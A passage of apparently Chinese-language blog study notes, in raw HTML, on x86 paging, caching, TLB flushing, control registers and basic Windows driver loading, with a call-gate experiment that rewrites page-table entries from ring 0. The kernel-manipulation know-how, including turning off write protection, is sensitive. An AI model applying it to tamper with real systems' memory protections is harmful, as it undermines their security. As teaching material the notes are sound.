class=\"line\">.text:004B4B2E                 leave</span><br><span class=\"line\">.text:004B4B2F                 retn</span><br><span class=\"line\"></span><br><span class=\"line\">80b99000</span><br><span class=\"line\">右移18位 == 202e</span><br><span class=\"line\">202e &amp; 3ff8 == 2028</span><br><span class=\"line\">2028- 3fa00000 = c0602028</span><br></pre></td></tr></table></figure>\n<p>内核编译器和 ring3 编译器不一样</p>\n<p>XD = 0 当前页可以执行</p>\n<p>// PDE 与 PTE 最高位进行与， = 0 可执行  （小页看 PTE 高位，大页看 PDE 高位）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000000`62cc1867  // PDE</span><br><span class=\"line\">80000000`636ec867  // PTE </span><br></pre></td></tr></table></figure>\n<p>如果 XD 描述 PDE，那么代表这个 PDE 管理了所有的 PTE</p>\n<p>PDPTE 没有属性，只有 PCD 和 PWT</p>\n<p>4 个 PDPTE * 512 = 2048 PDE</p>\n<p>2048*512*8 = 8M</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231105211300962.png\" alt=\"image-20231105211300962\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231108000856947.png\" alt=\"image-20231108000856947\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231108180550851.png\" alt=\"image-20231108180550851\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231108180847403.png\" alt=\"image-20231108180847403\"></p>\n<h3 id=\"缓存\"><a class=\"markdownIt-Anchor\" href=\"#缓存\">#</a> 缓存</h3>\n<p>缓存类型</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231108220412054.png\" alt=\"image-20231108220412054\"></p>\n<p>UC 没有缓存，直接从板卡地址拿数据。强制无缓存</p>\n<p>UC- 有读缓存，无写缓存。弱无缓存</p>\n<p>WC 写组合 \\ 写合并，尝试从 L1 缓存行拿地址， 一次写 4 个地址，小于等于 4 都是按照组合写在同一时刻。每次刷新一个缓存行 (64 字节)</p>\n<p>WB 回写，到时间才刷到内存中去。延时性低。只需要写到缓存，定时一次性刷新</p>\n<p>WT 直写 直接写到缓存中，并且写到内存条中 。通常是做多媒体。全部写完才会返回</p>\n<p>主存不是完全的内存，是显卡 + 设备内存</p>\n<p>WP 写保护，只读</p>\n<p>系统的 dll 是写拷贝。当无法写入的时候产生异常，拷贝一份</p>\n<p>DLL 代码段一般是运行 只读 R/W=0 ，VAD 虚拟地址管理器，描述当前线性地址属性。线性地址和物理地址属性不一样</p>\n<p>write copy 写时拷贝：多个 exe 加载一个路径下同一个名字的 dll，或者任意的 PE 文件的时候，此 dll 的物理地址只有一份</p>\n<p>2.exe 如果强行去写 dll，不触发页异常的情况下 (修改 r/w=1)，会导致所有引用这个 dll 的 exe 全部被修改</p>\n<p>通过 VirtualProtected 修改之后，此时的 dll 已经不是一个物理页了，会挂新的物理页，再把 dll 复制过来</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231109193507076.png\" alt=\"image-20231109193507076\"></p>\n<p>PAT</p>\n<p>PWT = 0 回写  = 1 直写</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231109193730790.png\" alt=\"image-20231109193730790\"></p>\n<h3 id=\"tlb\"><a class=\"markdownIt-Anchor\" href=\"#tlb\">#</a> TLB</h3>\n<p>每个核有四个 TLB，两个数据 TLB- DTLB，两个指令 TLB-ITLB</p>\n<p>小的 TLB 存 PTE，大的 TLB 存 PDE</p>\n<p>PDE 大页一般都是 G=1，基本上在内核模块中        G=1 全局页</p>\n<p>!pte gdtr\t\t\t\t// 当前进程下</p>\n<p>!vtop cr3 gdtr</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231109233501934.png\" alt=\"image-20231109233501934\"></p>\n<p>1. 申请 2 个地址分别赋值</p>\n<p>2. 把第一个地址挂在 0 地址上，然后访问，取出结果保存变量</p>\n<p>3. 又把第二个地址挂在 o 地址上，然后访问，取出结果也保存变量</p>\n<p>4. 观察变量 1, 变量 2 的结果有什么不同</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 12.TLB.cpp : 定义控制台应用程序的入口点。</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">PUCHAR addr1 = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">PUCHAR addr2 = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">ULONG temp1=<span class=\"number\">0</span>,temp2 = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) <span class=\"built_in\">test1</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpushad;</span><br><span class=\"line\">\t\tpushfd;</span><br><span class=\"line\">\t\tpush <span class=\"number\">0x30</span>;</span><br><span class=\"line\">\t\tpop fs;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\tmov eax,[addr1];<span class=\"comment\">//线形地址1</span></span><br><span class=\"line\">\t\tshr eax,<span class=\"number\">0x9</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">and</span> eax,<span class=\"number\">0x7ffff8</span>;</span><br><span class=\"line\">\t\tadd eax,<span class=\"number\">0xc0000000</span>;</span><br><span class=\"line\">\t\tmov ecx,[eax];   <span class=\"comment\">//取低4字节</span></span><br><span class=\"line\">\t\tmov edx,[eax+<span class=\"number\">4</span>]; <span class=\"comment\">//取高4字节</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// or ecx,0x100;   // 设置G，G=1无法通过CR3导致刷新</span></span><br><span class=\"line\">\t\tmov dword ptr ds:[<span class=\"number\">0xc0000000</span>],ecx;</span><br><span class=\"line\">\t\tmov dword ptr ds:[<span class=\"number\">0xc0000004</span>],edx;</span><br><span class=\"line\">\t\tmov eax,dword ptr ds:[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t\tmov [temp1],eax;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\t<span class=\"comment\">//mov eax,cr3;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//mov cr3,eax;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov eax,[addr2];<span class=\"comment\">//线形地址2</span></span><br><span class=\"line\">\t\tshr eax,<span class=\"number\">0x9</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">and</span> eax,<span class=\"number\">0x7ffff8</span>;</span><br><span class=\"line\">\t\tadd eax,<span class=\"number\">0xc0000000</span>;</span><br><span class=\"line\">\t\tmov ecx,[eax];   <span class=\"comment\">//取低4字节</span></span><br><span class=\"line\">\t\tmov edx,[eax+<span class=\"number\">4</span>]; <span class=\"comment\">//取高4字节</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">        <span class=\"comment\">// 挂物理页</span></span><br><span class=\"line\">\t\tmov dword ptr ds:[<span class=\"number\">0xc0000000</span>],ecx;</span><br><span class=\"line\">\t\tmov dword ptr ds:[<span class=\"number\">0xc0000004</span>],edx;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//刷单条TLB</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//invlpg dword ptr ds:[0]</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov eax,dword ptr ds:[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t\tmov [temp2],eax;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpush <span class=\"number\">0x3b</span>;</span><br><span class=\"line\">\t\tpop fs;</span><br><span class=\"line\">\t\tpopfd;</span><br><span class=\"line\">\t\tpopad;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tretf;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\taddr1 = (PUCHAR)<span class=\"built_in\">VirtualAlloc</span>(<span class=\"literal\">NULL</span>,<span class=\"number\">0x1000</span>,MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\taddr2 = (PUCHAR)<span class=\"built_in\">VirtualAlloc</span>(<span class=\"literal\">NULL</span>,<span class=\"number\">0x1000</span>,MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\t*(PULONG)addr1 = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">\t*(PULONG)addr2 = <span class=\"number\">0x2000</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\ttemp1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttemp2 = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;addr1 = %x,addr2 = %x,test1=%x\\r\\n&quot;</span>,addr1,addr2,test1);</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> bufcode[]=&#123;<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x4b</span>,<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcall fword ptr bufcode;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;temp1 = %x,temp2 = %x\\r\\n&quot;</span>,temp1,temp2);</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>切换 CR3 的时候回认为切换页表，导致 TLB 刷新，TLB 中 G=0 的全部刷掉</p>\n<p>mov eax,cr3</p>\n<p>mov cr3,eax</p>\n<p>invlpg dowrd ptr ds:[]</p>\n<p>刷新方式： 切页表刷新 (刷新除 G=1 的情况)  /   invlpg 把地址变成无效缓存 (刷新一条)    /   CR4 控制寄存器中有一个 PGE，控制所有的 G 位是否有效 (刷新所有)</p>\n<p>切换线程的时候，判断当前被切换与切换是否是一个进程，如果不是会切换页表 CR3</p>\n<p>本质上切换进程就是切换 CR3</p>\n<h3 id=\"控制寄存器\"><a class=\"markdownIt-Anchor\" href=\"#控制寄存器\">#</a> 控制寄存器</h3>\n<p>x86 有五个，x64 还有一个 CR8</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231111195301493.png\" alt=\"image-20231111195301493\"></p>\n<p>CR2 保存了出异常的线性地址。针对于缺页和内存有问题的异常</p>\n<p>CR0 PE：开启保护模式，但是没有分页保护，只有段保护</p>\n<p>实模式通过写入字，打开 A20 端口，设置 CR0 进入保护模式</p>\n<p>PG：开启分页模式    PG+PE = 段页保护模式</p>\n<p>PE = 0，PG=1 无效    PE=0，PG=0 实模式   PE=1  PG = 0 段保护</p>\n<p>Windows 无法使用实模式，除非是裸机，但是有虚拟 8086 模式，叫做虚拟实模式</p>\n<p>TS：切换任务段，call 进去 =1 ，任务段切换标识</p>\n<p>CD = 1 关闭缓存</p>\n<p>AM 对齐位。对应 eflag 中 ac 的对齐检查。=1 32 位下堆栈必须 4 字节对齐，64 8 字节对齐</p>\n<p>WP  = 0 关闭写保护，不可写地址也可以写入。是 0 环写 3 环</p>\n<p>CR4 辅助功能</p>\n<p>VEM 开启虚拟中断，允许开启虚拟 8086 模式</p>\n<p>PVI 是否支持虚拟 8086 虚拟化中断，=1 允许</p>\n<p>TSD  只有特权级可以执行， = 1  3 环可以调用指令计算时间</p>\n<p>DE  =1 调试寄存器 DR4 和 DR5 可使用。DR6，DR7 的别名</p>\n<p>PSE 大页开关  =0 强制小页</p>\n<p>PAE  =1 29912， =0 10102 ，只在 32 位下有用，64 下面只有 999912</p>\n<p>MCE 机器检查</p>\n<p>PGE  =1 代表 G=1   =0 G=1 无效即没有全局页</p>\n<p>PCE  性能监控器是否开启</p>\n<p>VMXE VT 开启位 ， =1 进入 VT</p>\n<p>SMXE  SMM 上帝模式  super mode manage</p>\n<p>SMEP  SMAP  super mode execute protect   super mode access protect   =1 0 环不能执行 / 访问 US=1 的地址  。AM=0  这两个位无效</p>\n<p>PKE  页表密钥  =1 保护 key 保护用户地址</p>\n<p>IA-32e 兼容 cpu 支持 32 和 64，允许 64 位下运行 32 位程序</p>\n<p>IA-64 纯 64 位 cpu</p>\n<h2 id=\"驱动\"><a class=\"markdownIt-Anchor\" href=\"#驱动\">#</a> 驱动</h2>\n<p>加载驱动类似于用户区加载 dll，驱动是所有进程共享的。驱动本质是模块</p>\n<p>驱动有 NT 驱动，WDM，WDF (KWDF,UWDF</p>\n<p>NT 虚拟驱动，如果出现绑定设备，不能卸载，只能重启</p>\n<p>WDM 驱动，是一个热插拔方式，不需要重启</p>\n<p>WDF 简化开发的，封装了一部分驱动，相当于事件驱动机制 。KWDF 内核驱动框架  UWDF 用户驱动框架，基于 com 开发</p>\n<p>com 是 Windows 的一套组件，定义了一系列接口。对于 C#,js 等语言效果明显</p>\n<h3 id=\"hello-world\"><a class=\"markdownIt-Anchor\" href=\"#hello-world\">#</a> hello world</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231118144931361.png\" alt=\"image-20231118144931361\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231118145032673.png\" alt=\"image-20231118145032673\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">创建 empty wdm 文件</span><br><span class=\"line\">#include &lt;ntifs.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>sys 入口是 GsDriverEntry</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INIT:00405000 ; int __stdcall GsDriverEntry(_DRIVER_OBJECT *DriverObject, _UNICODE_STRING *RegistryPath)</span><br><span class=\"line\">INIT:00405000                 public _GsDriverEntry@8</span><br><span class=\"line\">INIT:00405000 _GsDriverEntry@8 proc near              ; DATA XREF: .rdata:00402004↑o</span><br><span class=\"line\">INIT:00405000</span><br><span class=\"line\">INIT:00405000 DriverObject    = dword ptr  8</span><br><span class=\"line\">INIT:00405000 RegistryPath    = dword ptr  0Ch</span><br><span class=\"line\">INIT:00405000</span><br><span class=\"line\">INIT:00405000                 mov     edi, edi</span><br><span class=\"line\">INIT:00405002                 push    ebp</span><br><span class=\"line\">INIT:00405003                 mov     ebp, esp</span><br><span class=\"line\">INIT:00405005                 call    ___security_init_cookie</span><br><span class=\"line\">INIT:0040500A                 pop     ebp</span><br><span class=\"line\">INIT:0040500B                 jmp     _DriverEntry@8  ; DriverEntry(x,x)</span><br><span class=\"line\">INIT:0040500B _GsDriverEntry@8 endp</span><br><span class=\"line\">INIT:0040500B</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231118150152408.png\" alt=\"image-20231118150152408\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231118151446842.png\" alt=\"image-20231118151446842\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231118152630283.png\" alt=\"image-20231118152630283\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; dt pDriver </span><br><span class=\"line\">Local var @ 0x8c72c9e0 Type _DRIVER_OBJECT*</span><br><span class=\"line\">0x865c9f08 </span><br><span class=\"line\">   +0x000 Type             : 0n4</span><br><span class=\"line\">   +0x002 Size             : 0n168</span><br><span class=\"line\">   +0x004 DeviceObject     : (null) </span><br><span class=\"line\">   +0x008 Flags            : 2</span><br><span class=\"line\">   +0x00c DriverStart      : 0x96dcb000 Void</span><br><span class=\"line\">   +0x010 DriverSize       : 0x6000</span><br><span class=\"line\">   +0x014 DriverSection    : 0x864ef0d8 Void</span><br><span class=\"line\">   +0x018 DriverExtension  : 0x865c9fb0 _DRIVER_EXTENSION</span><br><span class=\"line\">   +0x01c DriverName       : _UNICODE_STRING &quot;\\Driver\\3&quot;</span><br><span class=\"line\">   +0x024 HardwareDatabase : 0x84177250 _UNICODE_STRING &quot;\\REGISTRY\\MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM&quot;</span><br><span class=\"line\">   +0x028 FastIoDispatch   : (null) </span><br><span class=\"line\">   +0x02c DriverInit       : 0x96dcf000     long  3!GsDriverEntry+0</span><br><span class=\"line\">   +0x030 DriverStartIo    : (null) </span><br><span class=\"line\">   +0x034 DriverUnload     : (null) </span><br><span class=\"line\">   +0x038 MajorFunction    : [28] 0x83ec0da3     long  nt!IopInvalidDeviceRequest+0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; dt _DRIVER_EXTENSION 0x865c9fb0</span><br><span class=\"line\">nt!_DRIVER_EXTENSION</span><br><span class=\"line\">   +0x000 DriverObject     : 0x865c9f08 _DRIVER_OBJECT</span><br><span class=\"line\">   +0x004 AddDevice        : (null) </span><br><span class=\"line\">   +0x008 Count            : 0</span><br><span class=\"line\">   +0x00c ServiceKeyName   : _UNICODE_STRING &quot;3&quot;</span><br><span class=\"line\">   +0x014 ClientDriverExtension : (null) </span><br><span class=\"line\">   +0x018 FsFilterCallbacks : (null) </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231118153307784.png\" alt=\"image-20231118153307784\"></p>\n<p>start  2 开启自启  3 手工启动  4 禁用</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231118153559163.png\" alt=\"image-20231118153559163\"></p>\n<p>ImagePath  ?? 是内核路径</p>\n<p>type 驱动 = 1</p>\n<p>加载驱动</p>\n<p>1. 服务加载。调用 Windows 所提供的服务，并不是本进程加载。通过 csrss 写注册表</p>\n<p>opensrcmanage</p>\n<p>CreateService</p>\n<p>StartService</p>\n<p>StopService</p>\n<p>DeleteService</p>\n<p>2. 本地加载</p>\n<p>调用 zw/ntloadDriver</p>\n<p>卸载调用 Zw/NtUnloadDriver</p>\n<p>杀软链接模块加载时候，方式一拦截不到进程，只能通过其他方式获取进程是谁</p>\n<p>方式二直接拦截，知道是谁加载</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">UNICODE_STRING</span> &#123;</span></span><br><span class=\"line\">    USHORT Length;</span><br><span class=\"line\">    USHORT MaximumLength;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> MIDL_PASS</span></span><br><span class=\"line\">    [size_is(MaximumLength / <span class=\"number\">2</span>), length_is((Length) / <span class=\"number\">2</span>) ] USHORT * Buffer;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span> <span class=\"comment\">// MIDL_PASS</span></span></span><br><span class=\"line\">    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH   Buffer;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">// MIDL_PASS</span></span></span><br><span class=\"line\">&#125; UNICODE_STRING;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 命令行启动 3.sys</span></span><br><span class=\"line\">net start <span class=\"number\">3</span>  </span><br><span class=\"line\">    </span><br><span class=\"line\">net stop <span class=\"number\">3</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ntifs.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">DRIVERUNLOAD</span><span class=\"params\">(PDRIVER_OBJECT DriverObject)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDbgPrint(<span class=\"string\">&quot;unload\\r\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS <span class=\"title function_\">DriverEntry</span><span class=\"params\">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDbgBreakPoint();</span><br><span class=\"line\">\tpDriver-&gt;DriverUnload = DRIVERUNLOAD;</span><br><span class=\"line\">\tDbgPrint(<span class=\"string\">&quot;===================%wZ=========\\r\\n&quot;</span>,pReg);  <span class=\"comment\">// printf  wz打印Unicode字符串指针  ===================\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\services\\9=========</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"类型\"><a class=\"markdownIt-Anchor\" href=\"#类型\">#</a> 类型</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INT - int</span><br><span class=\"line\">UCHAR - unsigned char</span><br><span class=\"line\">typedef _Return_type_success_(return &gt;= 0) LONG NTSTATUS;</span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS status = xxx;</span><br><span class=\"line\">if (NT_SUCCESS(status)) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"字符串函数\"><a class=\"markdownIt-Anchor\" href=\"#字符串函数\">#</a> 字符串函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//@[comment(&quot;MVI_tracked&quot;)]</span></span><br><span class=\"line\">__kernel_entry NTSYSCALLAPI</span><br><span class=\"line\">NTSTATUS</span><br><span class=\"line\">NTAPI</span><br><span class=\"line\"><span class=\"title function_\">NtOpenProcess</span> <span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">    _Out_ PHANDLE ProcessHandle,</span></span><br><span class=\"line\"><span class=\"params\">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class=\"line\"><span class=\"params\">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class=\"line\"><span class=\"params\">    _In_opt_ PCLIENT_ID ClientId</span></span><br><span class=\"line\"><span class=\"params\">    